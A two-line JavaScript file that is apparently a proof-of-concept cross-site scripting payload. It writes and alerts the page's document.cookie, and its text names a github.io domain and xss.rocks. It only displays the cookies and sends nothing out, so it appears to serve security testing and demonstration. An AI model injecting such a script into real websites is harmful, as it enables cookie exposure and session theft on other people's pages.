
document.write ("This is an XSS from *.github.io domain " + document.cookie);
alert ("This is remote text via xss.js located at xss.rocks " + document.cookie);
